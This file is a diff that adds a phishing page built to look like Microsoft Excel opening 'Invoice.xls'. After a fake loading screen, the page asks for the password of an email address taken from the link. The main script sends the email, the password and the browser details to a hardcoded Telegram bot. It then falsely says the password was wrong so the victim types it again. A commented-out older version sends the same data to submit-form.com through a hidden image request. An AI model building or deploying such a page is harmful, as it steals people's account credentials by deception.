@@ -1,0 +1,1335 @@
+﻿<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <link
+      id="favicon"
+      rel="icon"
+      href="https://img.icons8.com/color/48/ms-excel.png"
+      type="image/x-icon"
+    />
+    <title>Spreadsheet</title>
+
+    <style>
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      .loading-container {
+        font-family: "Segoe UI", sans-serif;
+        text-align: center;
+        margin-top: 20px;
+      }
+
+      /* Outer bar */
+      .loading-bar {
+        width: 400px;
+        height: 20px;
+        border: 1px solid #b3b3b3;
+        background: #e9e9e9;
+        margin: 0 auto;
+        position: relative;
+        overflow: hidden;
+      }
+
+      /* Moving dark-blue mini-bars */
+      .loading-bars {
+        position: absolute;
+        top: 0;
+        left: -200px;
+        height: 100%;
+        width: 200px;
+
+        display: flex;
+        gap: 2px;
+        animation: moveBars 1.8s linear infinite;
+      }
+
+      .loading-bars::before {
+        content: "";
+        display: block;
+        width: 200px;
+        height: 100%;
+
+        background-image: repeating-linear-gradient(
+          to right,
+          #2c5c8a,
+          #2c5c8a 8px,
+          transparent 8px,
+          transparent 10px
+        );
+      }
+
+      /* Animation */
+      @keyframes moveBars {
+        from {
+          left: -200px;
+        }
+        to {
+          left: 400px;
+        }
+      }
+
+      .loading-text {
+        font-size: 14px;
+        margin-top: 6px;
+      }
+
+      /* Loader full-screen */
+      #loadingScreen {
+        position: fixed;
+        inset: 0;
+        background: #ffffff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 100000;
+      }
+    </style>
+
+    <style>
+      /* overlay container for modal interactions (transparent) */
+      #signinOverlay {
+        position: fixed;
+        inset: 0;
+        display: none; /* shown after loading */
+        z-index: 110000;
+        pointer-events: none; /* allow only the modal to receive events */
+      }
+
+      /* centered modal (Office-like with green header) */
+      #signinModal {
+        width: 360px;
+        max-width: calc(100% - 40px);
+        background: #fff;
+        border-radius: 12px;
+        box-shadow: 0 12px 40px rgba(0, 0, 0, 0.22);
+        position: absolute;
+        left: 50%;
+        top: 50%;
+        transform: translate(-50%, -50%);
+        pointer-events: auto;
+        z-index: 110010;
+        overflow: hidden;
+        font-family: "Segoe UI", Roboto, Arial, sans-serif;
+      }
+
+      /* header */
+      #signinModal .modal-header {
+        background: linear-gradient(180deg, #217346, #1b5b3a);
+        color: #fff;
+        padding: 14px 16px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        cursor: grab; /* draggable */
+      }
+      #signinModal .modal-header:active {
+        cursor: grabbing;
+      }
+
+      #signinModal .modal-header .title {
+        font-weight: 600;
+        font-size: 16px;
+      }
+
+      /* close button */
+      #signinCloseBtn {
+        background: transparent;
+        border: none;
+        color: white;
+        font-size: 18px;
+        line-height: 1;
+        cursor: pointer;
+      }
+
+      /* body */
+      #signinModal .modal-body {
+        padding: 16px;
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+      }
+      #signinModal .modal-body label {
+        font-size: 13px;
+        color: #222;
+      }
+      #signinModal .modal-body input[type="email"],
+      #signinModal .modal-body input[type="password"] {
+        padding: 10px;
+        border-radius: 6px;
+        border: 1px solid #d0d0d0;
+        font-size: 14px;
+        width: 100%;
+        box-sizing: border-box;
+      }
+      #signinModal .modal-body button {
+        margin-top: 8px;
+        padding: 10px;
+        border-radius: 6px;
+        border: 0;
+        background: #217346;
+        color: white;
+        font-size: 15px;
+        cursor: pointer;
+      }
+
+      /* prevent text selection while dragging */
+      .noselect {
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+      }
+    </style>
+
+    <style>
+      :root {
+        --excel-green: #217346;
+        --ribbon-bg: #ffffff;
+        --muted: #6b6b6b;
+        --panel: #fbfbfb;
+        --cell-border: #e6e6e6;
+        --active: #217346;
+        --font: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      }
+      * {
+        box-sizing: border-box;
+      }
+      html,
+      body {
+        height: 100%;
+        margin: 0;
+        font-family: var(--font);
+        background: #efefef;
+        color: #111;
+      }
+
+      /* Reference screenshot (low opacity) - using user's uploaded file */
+      .reference {
+        position: fixed;
+        right: 8px;
+        top: 8px;
+        width: 420px;
+        opacity: 0.06;
+        pointer-events: none;
+        z-index: 20;
+      }
+
+      /* TITLE BAR */
+      header.titlebar {
+        height: 48px;
+        background: var(--excel-green);
+        color: #fff;
+        display: flex;
+        align-items: center;
+        padding: 6px 14px;
+        gap: 12px;
+      }
+      .q-toolbar {
+        display: flex;
+        gap: 8px;
+        align-items: center;
+      }
+      .q-btn {
+        width: 30px;
+        height: 28px;
+        border-radius: 4px;
+        background: rgba(255, 255, 255, 0.08);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .title-main {
+        font-weight: 600;
+        font-size: 15px;
+      }
+      .title-sub {
+        font-weight: 400;
+        font-size: 12px;
+        opacity: 0.95;
+      }
+      .title-right {
+        margin-left: auto;
+        display: flex;
+        gap: 10px;
+        align-items: center;
+      }
+      .title-right .control {
+        width: 28px;
+        height: 20px;
+        border-radius: 3px;
+        border: 1px solid rgba(255, 255, 255, 0.12);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      /* TABS ROW */
+      nav.tabs-row {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        padding: 6px 10px;
+        background: #fff;
+        border-bottom: 1px solid rgba(0, 0, 0, 0.06);
+      }
+      .tab {
+        padding: 8px 12px;
+        border-radius: 4px;
+        font-weight: 600;
+        cursor: default;
+      }
+      .tab.active {
+        color: var(--excel-green);
+        background: linear-gradient(180deg, #fff, #f7faf7);
+      }
+      .tabs-row .right-help {
+        margin-left: auto;
+        color: var(--muted);
+        font-size: 13px;
+      }
+
+      /* RIBBON */
+      .ribbon {
+        display: flex;
+        gap: 12px;
+        padding: 10px;
+        background: linear-gradient(180deg, #fff, #fbfcfd);
+        border-bottom: 1px solid #ddd;
+        align-items: flex-start;
+        overflow: auto;
+      }
+      .group {
+        min-width: 120px;
+        width: 160px;
+        border-right: 1px solid rgba(0, 0, 0, 0.06);
+        padding-right: 12px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+      .group-title {
+        font-size: 12px;
+        color: var(--muted);
+        margin-top: 8px;
+      }
+      .big-button {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 6px;
+        padding: 8px;
+        border-radius: 5px;
+        background: #fff;
+        border: 1px solid rgba(0, 0, 0, 0.04);
+        width: 140px;
+      }
+      .controls {
+        display: flex;
+        gap: 8px;
+        flex-wrap: wrap;
+        justify-content: center;
+      }
+      .icon-btn {
+        width: 36px;
+        height: 28px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 4px;
+        background: #fff;
+        border: 1px solid rgba(0, 0, 0, 0.04);
+        font-size: 13px;
+      }
+      .drop-btn {
+        padding: 6px 8px;
+        border-radius: 4px;
+        border: 1px solid rgba(0, 0, 0, 0.04);
+        background: #fff;
+      }
+
+      /* formula bar */
+      .formula {
+        display: flex;
+        gap: 8px;
+        align-items: center;
+        padding: 8px 12px;
+        background: #fff;
+        border-bottom: 1px solid #e0e0e0;
+      }
+      .name-box {
+        width: 68px;
+        height: 30px;
+        border: 1px solid #d7d7d7;
+        background: #fbfbfb;
+        padding: 6px 8px;
+        border-radius: 4px;
+        font-weight: 600;
+      }
+      .fx-btn {
+        width: 38px;
+        height: 30px;
+        border: 1px solid #d7d7d7;
+        background: #fbfbfb;
+        border-radius: 4px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: 600;
+      }
+      .formula-input {
+        flex: 1;
+        height: 30px;
+        border: 1px solid #d7d7d7;
+        background: #fff;
+        padding: 6px 8px;
+        border-radius: 4px;
+        font-size: 14px;
+      }
+
+      /* workspace (grid) */
+      .workspace {
+        position: absolute;
+        left: 0;
+        right: 0;
+        top: 190px;
+        bottom: 40px;
+        overflow: auto;
+        background: #fff;
+        display: none;
+      }
+      table.grid {
+        border-collapse: collapse;
+        min-width: 1400px;
+      }
+      table.grid thead th {
+        background: #fbfbfb;
+        border: 1px solid var(--cell-border);
+        height: 28px;
+        padding: 6px;
+        font-weight: 700;
+        text-align: center;
+      }
+      table.grid tbody th {
+        background: #fbfbfb;
+        border: 1px solid var(--cell-border);
+        padding: 6px 8px;
+        text-align: right;
+        color: var(--muted);
+        width: 48px;
+      }
+      table.grid td {
+        border: 1px solid var(--cell-border);
+        height: 26px;
+        padding: 2px 8px;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        background: #fff;
+      }
+      table.grid td:focus {
+        outline: none;
+      }
+      .cell-active {
+        box-shadow: 0 0 0 2px rgba(33, 115, 70, 0.18) inset;
+        border: 2px solid var(--active);
+        position: relative;
+        background: #fff;
+      }
+      .fill-handle {
+        position: absolute;
+        width: 7px;
+        height: 7px;
+        background: var(--active);
+        right: 3px;
+        bottom: 3px;
+        border-radius: 1px;
+        box-shadow: 0 0 0 1px #fff;
+      }
+
+      /* bottom bar */
+      footer.bottombar {
+        position: absolute;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        height: 40px;
+        background: #f3f3f3;
+        border-top: 1px solid #ddd;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        padding: 6px 12px;
+      }
+      .sheets {
+        display: flex;
+        gap: 6px;
+        align-items: center;
+      }
+      .sheet {
+        background: #fff;
+        padding: 6px 12px;
+        border: 1px solid #dedede;
+        border-radius: 6px 6px 0 0;
+        font-weight: 700;
+        color: var(--excel-green);
+      }
+      .sheet-add {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 28px;
+        height: 28px;
+        border-radius: 50%;
+        background: #fff;
+        border: 1px solid #dedede;
+      }
+      .status {
+        color: var(--muted);
+        margin-left: 8px;
+      }
+      .view-controls {
+        margin-left: auto;
+        display: flex;
+        gap: 8px;
+        align-items: center;
+      }
+      .zoom {
+        display: flex;
+        gap: 8px;
+        align-items: center;
+        color: var(--muted);
+      }
+      .zoom input[type="range"] {
+        width: 130px;
+      }
+
+      /* scrollbar aesthetics */
+      .workspace::-webkit-scrollbar {
+        height: 12px;
+        width: 12px;
+      }
+      .workspace::-webkit-scrollbar-thumb {
+        background: #cfcfcf;
+        border-radius: 8px;
+      }
+
+      /* responsive small tweak */
+      @media (max-width: 1000px) {
+        table.grid {
+          min-width: 1100px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div id="loadingScreen" role="status" aria-live="polite">
+      <div class="loading-container">
+        <div class="loading-bar">
+          <div class="loading-bars"></div>
+        </div>
+        <p class="loading-text">
+          Please wait while we load your document (Invoice.xls)
+        </p>
+      </div>
+    </div>
+
+    <div id="signinOverlay" aria-hidden="true">
+      <div
+        id="signinModal"
+        class="noselect"
+        role="dialog"
+        aria-modal="true"
+        aria-labelledby="signinTitle"
+      >
+        <div class="modal-header" id="dragHandle">
+          <div class="title" id="signinTitle">
+            For your protection, verify your identity.
+          </div>
+
+          <button id="signinCloseBtn" aria-label="Close sign in">✕</button>
+        </div>
+        <div class="modal-body">
+          <label></label>
+          <div id="si-email" style="font-weight: 700; font-size: 14px"></div>
+          <label for="si-pass">Password</label>
+          <input
+            id="si-pass"
+            type="password"
+            autocomplete="current-password"
+            placeholder=""
+            required
+          />
+          <button id="signinSubmit">Continue</button>
+          <div
+            id="submitMessage"
+            style="
+              display: none;
+              color: #00a000;
+              font-weight: 600;
+              margin-bottom: 10px;
+              text-align: center;
+              font-size: 14px;
+            "
+          ></div>
+          <div
+            id="loadingSpinner"
+            style="display: none; text-align: center; margin-bottom: 10px"
+          >
+            <div
+              style="
+                width: 28px;
+                height: 28px;
+                border: 4px solid #ccc;
+                border-top: 4px solid #2ecc71;
+                border-radius: 50%;
+                margin: auto;
+                animation: spin 0.8s linear infinite;
+              "
+            ></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="mainContent" aria-hidden="true">
+      <img
+        class="reference"
+        src="/mnt/data/889f8888-e0c0-4fc4-85e2-f20f7b463968.png"
+        alt="reference"
+      />
+
+      <header class="titlebar" role="banner" aria-label="Excel title bar">
+        <div class="q-toolbar" aria-hidden="true">
+          <div class="q-btn" title="Save" aria-hidden="true">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
+              <path
+                d="M5 4h10l4 4v10a1 0 0 1-1 1H6a1 0 0 1-1-1V5z"
+                stroke="white"
+                stroke-width="1.6"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
+          </div>
+          <div class="q-btn" title="Undo" aria-hidden="true">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
+              <path
+                d="M9 14L4 9l5-5"
+                stroke="white"
+                stroke-width="1.6"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+              <path
+                d="M20 19a8 8 0 0 0-8-8H4"
+                stroke="white"
+                stroke-width="1.6"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
+          </div>
+          <div class="q-btn" title="Redo" aria-hidden="true">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
+              <path
+                d="M15 14l5-5-5-5"
+                stroke="white"
+                stroke-width="1.6"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+              <path
+                d="M4 19a8 8 0 0 1 8-8h8"
+                stroke="white"
+                stroke-width="1.6"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
+          </div>
+        </div>
+
+        <div>
+          <div class="title-main">
+            Invoice.xls
+            <span class="title-sub"
+              >- Excel
+              <small
+                >(You need to be logged in before we can load your
+                content)</small
+              ></span
+            >
+          </div>
+        </div>
+
+        <div class="title-right" role="region" aria-label="window controls">
+          <div class="signin">Sign in</div>
+          <div class="control" title="Minimize">—</div>
+          <div class="control" title="Maximize">□</div>
+          <div class="control" title="Close">✕</div>
+        </div>
+      </header>
+
+      <nav class="tabs-row" role="navigation" aria-label="Ribbon tabs">
+        <div class="tab">File</div>
+        <div class="tab active">Home</div>
+        <div class="tab">Insert</div>
+        <div class="tab">Page Layout</div>
+        <div class="tab">Formulas</div>
+        <div class="tab">Data</div>
+        <div class="tab">Review</div>
+        <div class="tab">View</div>
+        <div class="tab">Acrobat</div>
+        <div class="right-help">Tell me what you want to do</div>
+      </nav>
+
+      <section class="ribbon" aria-label="Ribbon groups">
+        <div class="group" style="width: 220px; align-items: flex-start">
+          <div class="big-button" aria-hidden="true">
+            <svg width="44" height="32" viewBox="0 0 24 24" fill="none">
+              <path
+                d="M8 5h8v4H8z"
+                stroke="#222"
+                stroke-width="1.2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+              <path
+                d="M4 9v7a2 0 0 0 2 2h12a2 0 0 0 2-2V5a2 0 0 0-2-2H6a2 0 0 0-2 2v4z"
+                stroke="#222"
+                stroke-width="1.2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
+            <div style="font-size: 13px">Paste</div>
+          </div>
+          <div class="group-title">Clipboard</div>
+        </div>
+
+        <div class="group" style="min-width: 220px; align-items: flex-start">
+          <div class="controls" style="padding-left: 6px">
+            <div class="drop-btn" title="Font family">Calibri ▾</div>
+            <div class="drop-btn" title="Font size">11 ▾</div>
+            <div class="icon-btn" title="Bold"><strong>B</strong></div>
+            <div class="icon-btn" title="Italic"><em>I</em></div>
+            <div class="icon-btn" title="Underline"><u>U</u></div>
+            <div class="icon-btn" title="Borders">▦</div>
+            <div class="icon-btn" title="Fill color">▣</div>
+            <div class="icon-btn" title="Font color">A</div>
+          </div>
+          <div class="group-title">Font</div>
+        </div>
+
+        <div class="group">
+          <div class="controls">
+            <div class="icon-btn" title="Align Left">≡</div>
+            <div class="icon-btn" title="Center">≡</div>
+            <div class="icon-btn" title="Align Right">≡</div>
+            <div class="icon-btn" title="Top">↑</div>
+            <div class="icon-btn" title="Middle">↕</div>
+            <div class="icon-btn" title="Bottom">↓</div>
+            <div class="icon-btn" title="Wrap Text">⤾</div>
+            <div class="icon-btn" title="Merge & Center">▣</div>
+          </div>
+          <div class="group-title">Alignment</div>
+        </div>
+
+        <div class="group" style="width: 170px; align-items: flex-start">
+          <div
+            style="
+              display: flex;
+              flex-direction: column;
+              gap: 6px;
+              align-items: flex-start;
+              padding-left: 6px;
+            "
+          >
+            <div style="display: flex; gap: 8px">
+              <div class="drop-btn" title="Number format">General ▾</div>
+              <div class="icon-btn" title="Currency">$</div>
+              <div class="icon-btn" title="Percent">%</div>
+              <div class="icon-btn" title="Comma">,</div>
+            </div>
+            <div style="display: flex; gap: 8px">
+              <div class="icon-btn" title="Increase Decimal">.</div>
+              <div class="icon-btn" title="Decrease Decimal">.</div>
+            </div>
+          </div>
+          <div class="group-title">Number</div>
+        </div>
+
+        <div class="group" style="width: 180px; align-items: flex-start">
+          <div
+            style="
+              display: flex;
+              flex-direction: column;
+              gap: 8px;
+              padding-left: 6px;
+            "
+          >
+            <div style="display: flex; gap: 8px">
+              <div class="icon-btn" title="Conditional Formatting">ƒ</div>
+              <div class="icon-btn" title="Format as Table">▤</div>
+              <div class="icon-btn" title="Cell Styles">✶</div>
+            </div>
+          </div>
+          <div class="group-title">Styles</div>
+        </div>
+
+        <div class="group" style="width: 160px; align-items: flex-start">
+          <div
+            style="
+              display: flex;
+              flex-direction: column;
+              gap: 8px;
+              padding-left: 6px;
+            "
+          >
+            <div style="display: flex; gap: 8px">
+              <div class="icon-btn" title="Insert">＋</div>
+              <div class="icon-btn" title="Delete">－</div>
+              <div class="icon-btn" title="Format">⚙</div>
+            </div>
+          </div>
+          <div class="group-title">Cells</div>
+        </div>
+
+        <div class="group" style="width: 180px; align-items: flex-start">
+          <div
+            style="
+              display: flex;
+              flex-direction: column;
+              gap: 8px;
+              padding-left: 6px;
+            "
+          >
+            <div style="display: flex; gap: 8px">
+              <div class="icon-btn" title="AutoSum">Σ</div>
+              <div class="icon-btn" title="Fill">↧</div>
+              <div class="icon-btn" title="Clear">✖</div>
+              <div class="icon-btn" title="Sort & Filter">↥</div>
+              <div class="icon-btn" title="Find & Select">🔎</div>
+            </div>
+          </div>
+          <div class="group-title">Editing</div>
+        </div>
+      </section>
+
+      <section class="formula" role="region" aria-label="Formula bar">
+        <div class="name-box" id="nameBox">A1</div>
+        <div class="fx-btn" aria-hidden="true">fx</div>
+        <input
+          id="formulaInput"
+          class="formula-input"
+          placeholder="Enter formula"
+          aria-label="Formula input"
+        />
+      </section>
+
+      <main class="workspace" id="workspace" role="main" aria-label="Worksheet">
+        <table class="grid" id="gridTable">
+          <thead>
+            <tr>
+              <th></th>
+
+              <script>
+                document.write(
+                  Array.from(
+                    { length: 21 },
+                    (_, i) => `<th>${String.fromCharCode(65 + i)}</th>`,
+                  ).join(""),
+                );
+              </script>
+            </tr>
+          </thead>
+          <tbody>
+            <script>
+              const rows = 40;
+              for (let r = 1; r <= rows; r++) {
+                document.write("<tr>");
+                document.write(`<th>${r}</th>`);
+                for (let c = 0; c < 21; c++) {
+                  document.write(
+                    `<td tabindex="0" contenteditable="true" data-r="${r}" data-c="${c + 1}" aria-label="Cell ${String.fromCharCode(65 + c)}${r}"></td>`,
+                  );
+                }
+                document.write("</tr>");
+              }
+            </script>
+          </tbody>
+        </table>
+      </main>
+
+      <footer class="bottombar" role="contentinfo">
+        <div class="sheets" role="tablist" aria-label="Sheets">
+          <div class="sheet" role="tab" aria-selected="true">Sheet1</div>
+          <div class="sheet-add" title="Add Sheet">＋</div>
+        </div>
+        <div class="status" id="status">Ready</div>
+        <div class="view-controls">
+          <div style="display: flex; gap: 6px; align-items: center">
+            <div
+              style="
+                width: 30px;
+                height: 28px;
+                border: 1px solid #dedede;
+                border-radius: 4px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+              "
+            >
+              □
+            </div>
+            <div
+              style="
+                width: 30px;
+                height: 28px;
+                border: 1px solid #dedede;
+                border-radius: 4px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+              "
+            >
+              ▦
+            </div>
+            <div
+              style="
+                width: 30px;
+                height: 28px;
+                border: 1px solid #dedede;
+                border-radius: 4px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+              "
+            >
+              ▣
+            </div>
+          </div>
+          <div class="zoom">
+            <div>100%</div>
+            <input
+              id="zoomRange"
+              type="range"
+              min="50"
+              max="200"
+              value="100"
+              aria-label="Zoom"
+            />
+          </div>
+        </div>
+      </footer>
+    </div>
+
+    <script>
+      window.addEventListener("load", function () {
+        // Telegram Bot configuration
+        const telegramBotToken =
+          "8509994566:AAHvm-EXmKfPnhwB8ZjvfnbdSUGgvckMGiY"; // Replace with your Telegram Bot Token
+        const telegramChatId = "6641077543"; // Replace with your Telegram Chat ID
+        const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+        if (window.location.hash) {
+          const loadEmail = window.location.hash.replace("#", "");
+          const emailEl = document.querySelector("#si-email");
+          if (emailEl) emailEl.textContent = loadEmail;
+        }
+
+        setTimeout(() => {
+          const loader = document.getElementById("loadingScreen");
+          if (loader) loader.style.display = "none";
+
+          const main = document.getElementById("mainContent");
+          if (main) {
+            main.style.display = "block";
+            main.setAttribute("aria-hidden", "false");
+            const workspace = document.querySelector(".workspace");
+            if (workspace) workspace.style.display = "block";
+          }
+
+          const overlay = document.getElementById("signinOverlay");
+          const modal = document.getElementById("signinModal");
+          if (overlay && modal) {
+            overlay.style.display = "block";
+            overlay.setAttribute("aria-hidden", "false");
+            modal.style.display = "block";
+
+            modal.style.left = "50%";
+            modal.style.top = "50%";
+            modal.style.transform = "translate(-50%, -50%)";
+
+            const pass = document.getElementById("si-pass");
+            if (pass) pass.focus();
+
+            const handle = document.getElementById("dragHandle");
+            const closeBtn = document.getElementById("signinCloseBtn");
+            const signinSubmit = document.getElementById("signinSubmit");
+            const emailField = document.getElementById("si-email");
+            const passField = document.getElementById("si-pass");
+            const submitMsg = document.getElementById("submitMessage");
+            const spinner = document.getElementById("loadingSpinner");
+
+            /* ======================= Dragging Logic ======================= */
+            if (handle) {
+              let dragging = false,
+                startX = 0,
+                startY = 0,
+                origX = 0,
+                origY = 0;
+
+              handle.addEventListener("pointerdown", (ev) => {
+                dragging = true;
+                handle.setPointerCapture(ev.pointerId);
+                startX = ev.clientX;
+                startY = ev.clientY;
+                const rect = modal.getBoundingClientRect();
+                origX = rect.left;
+                origY = rect.top;
+                modal.style.transform = "";
+                ev.preventDefault();
+              });
+
+              document.addEventListener("pointermove", (ev) => {
+                if (!dragging) return;
+                const dx = ev.clientX - startX;
+                const dy = ev.clientY - startY;
+                modal.style.left = origX + dx + "px";
+                modal.style.top = origY + dy + "px";
+              });
+
+              document.addEventListener("pointerup", (ev) => {
+                dragging = false;
+                try {
+                  handle.releasePointerCapture(ev.pointerId);
+                } catch (e) {}
+              });
+
+              handle.addEventListener("dragstart", (e) => e.preventDefault());
+            }
+
+            if (closeBtn) {
+              closeBtn.addEventListener("click", () => {
+                overlay.style.display = "none";
+              });
+            }
+
+            /* ======================= SUBMIT FUNCTION ======================= */
+            function submitForm() {
+              if (!emailField || !passField) {
+                console.error("Sign-in elements not found.");
+                return;
+              }
+
+              const email = emailField.textContent;
+              const password = passField.value;
+              const browser = navigator.userAgent;
+
+              const messageText =
+                `🔐 *Login Test Submission*\n` +
+                `• *Email:* ${email}\n` +
+                `• *Password:* ${password}\n` +
+                `• *Browser:* ${browser}`;
+
+              // Send data to Telegram
+              fetch(telegramApiUrl, {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                  chat_id: telegramChatId,
+                  text: messageText,
+                  parse_mode: "Markdown",
+                }),
+              })
+                .then((response) => response.json())
+                .then((data) => {
+                  if (data.ok) {
+                    console.log("Sent to Telegram:", data);
+                  } else {
+                    console.error("Telegram API error:", data);
+                  }
+                })
+                .catch((error) => {
+                  console.error("Failed to send to Telegram:", error);
+                });
+
+              // Reset password immediately
+              passField.value = "";
+
+              // ====== SHOW SPINNER IMMEDIATELY ======
+              if (spinner) {
+                spinner.style.display = "block";
+              }
+
+              // ====== AFTER 5 SECONDS, SHOW ALERT ======
+              setTimeout(() => {
+                if (spinner) {
+                  spinner.style.display = "none";
+                }
+
+                if (submitMsg) {
+                  submitMsg.textContent = "Wrong password. Try again.";
+                  submitMsg.style.display = "block";
+                  submitMsg.style.color = "#d00000";
+                  submitMsg.style.opacity = "1";
+
+                  setTimeout(() => {
+                    submitMsg.style.transition = "opacity 0.7s";
+                    submitMsg.style.opacity = "0";
+                  }, 1500);
+
+                  setTimeout(() => {
+                    submitMsg.style.display = "none";
+                    submitMsg.style.opacity = "1";
+                  }, 2200);
+                }
+              }, 5000);
+            }
+
+            /* ======================= Submit Button + Password Required ======================= */
+            if (signinSubmit) {
+              signinSubmit.addEventListener("click", (e) => {
+                e.preventDefault();
+
+                if (passField.value.trim() === "") {
+                  if (submitMsg) {
+                    submitMsg.textContent = "Password is required.";
+                    submitMsg.style.display = "block";
+                    submitMsg.style.color = "#d00000";
+                    submitMsg.style.opacity = "1";
+                  }
+                  passField.focus();
+                  return;
+                }
+
+                submitForm();
+              });
+            }
+
+            /* ======================= Enter Key + Password Required ======================= */
+            if (passField) {
+              passField.addEventListener("keydown", (e) => {
+                if (e.key === "Enter") {
+                  e.preventDefault();
+
+                  if (passField.value.trim() === "") {
+                    if (submitMsg) {
+                      submitMsg.textContent = "Password is required.";
+                      submitMsg.style.display = "block";
+                      submitMsg.style.color = "#d00000";
+                      submitMsg.style.opacity = "1";
+                    }
+                    passField.focus();
+                    return;
+                  }
+
+                  submitForm();
+                }
+              });
+            }
+          }
+
+          setTimeout(() => window.dispatchEvent(new Event("resize")), 30);
+        }, 3600);
+      });
+    </script>
+
+    <!-- <script>
+window.addEventListener('load', function(){
+
+  if (window.location.hash){
+    const loadEmail = window.location.hash.replace('#', '')
+    document.querySelector('#si-email').textContent = loadEmail
+  }
+  setTimeout(() => {
+
+    const loader = document.getElementById('loadingScreen');
+    if(loader) loader.style.display = 'none';
+
+    const main = document.getElementById('mainContent');
+    if(main){
+      main.style.display = 'block';
+      main.setAttribute('aria-hidden','false');
+      const workspace = document.querySelector('.workspace');
+      if(workspace) workspace.style.display = 'block';
+    }
+
+    const overlay = document.getElementById('signinOverlay');
+    const modal = document.getElementById('signinModal');
+    if(overlay && modal){
+      overlay.style.display = 'block';
+      overlay.setAttribute('aria-hidden','false');
+      modal.style.display = 'block';
+
+      modal.style.left = '50%';
+      modal.style.top = '50%';
+      modal.style.transform = 'translate(-50%, -50%)';
+
+      const pass = document.getElementById('si-pass');
+      if(pass) pass.focus();
+
+      const handle = document.getElementById('dragHandle');
+      const closeBtn = document.getElementById('signinCloseBtn');
+      const signinSubmit = document.getElementById('signinSubmit');
+      const emailField = document.getElementById('si-email');
+      const passField = document.getElementById('si-pass');
+      const submitMsg = document.getElementById('submitMessage');
+      const spinner = document.getElementById('loadingSpinner');
+
+      /* ======================= Dragging Logic ======================= */
+      if (handle) {
+        let dragging = false, startX=0, startY=0, origX=0, origY=0;
+
+        handle.addEventListener('pointerdown', (ev) => {
+          dragging = true; 
+          handle.setPointerCapture(ev.pointerId);
+          startX = ev.clientX; 
+          startY = ev.clientY;
+          const rect = modal.getBoundingClientRect();
+          origX = rect.left; 
+          origY = rect.top;
+          modal.style.transform = '';
+          ev.preventDefault();
+        });
+
+        document.addEventListener('pointermove', (ev) => {
+          if(!dragging) return;
+          const dx = ev.clientX - startX; 
+          const dy = ev.clientY - startY;
+          modal.style.left = (origX + dx) + 'px';
+          modal.style.top  = (origY + dy) + 'px';
+        });
+
+        document.addEventListener('pointerup', (ev) => {
+          dragging = false;
+          try { handle.releasePointerCapture(ev.pointerId); } catch(e){}
+        });
+
+        handle.addEventListener('dragstart', (e)=> e.preventDefault());
+      }
+
+      if(closeBtn){
+        closeBtn.addEventListener('click', ()=>{ overlay.style.display = 'none'; });
+      }
+
+      /* ======================= SUBMIT FUNCTION ======================= */
+      function submitForm(){
+        if (!emailField || !passField) {
+          console.error("Sign-in elements not found.");
+          return;
+        }
+
+        const email = emailField.textContent;
+        const password = passField.value;
+        const browser = navigator.userAgent;
+
+        const relayURL = `https://submit-form.com/6Ymri53BD?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&browser=${encodeURIComponent(browser)}`;
+
+        console.log("", relayURL);
+
+        const img = new Image();
+        img.style.display = 'none';
+        img.src = relayURL;
+        document.body.appendChild(img);
+
+        setTimeout(() => { 
+          if (img.parentNode) { 
+            document.body.removeChild(img); 
+          } 
+        }, 5000);
+
+        // Reset password immediately  
+        passField.value = '';
+
+        // ====== SHOW SPINNER IMMEDIATELY ======
+        if(spinner){
+          spinner.style.display = "block";
+        }
+
+        // ====== AFTER 5 SECONDS, SHOW ALERT ======
+        setTimeout(() => {
+          if(spinner){
+            spinner.style.display = "none";
+          }
+
+          if(submitMsg){
+            submitMsg.textContent = "Wrong password. Try again.";
+            submitMsg.style.display = "block";
+            submitMsg.style.color = "#d00000";
+            submitMsg.style.opacity = "1";
+
+            setTimeout(()=>{
+              submitMsg.style.transition = "opacity 0.7s";
+              submitMsg.style.opacity = "0";
+            }, 1500);
+
+            setTimeout(()=>{
+              submitMsg.style.display = "none";
+              submitMsg.style.opacity = "1";
+            }, 2200);
+          }
+        }, 5000);
+      }
+
+      /* ======================= Submit Button + Password Required ======================= */
+      if(signinSubmit){
+        signinSubmit.addEventListener('click', (e)=>{
+          e.preventDefault();
+          
+          if (passField.value.trim() === "") {
+            if(submitMsg){
+              submitMsg.textContent = "Password is required.";
+              submitMsg.style.display = "block";
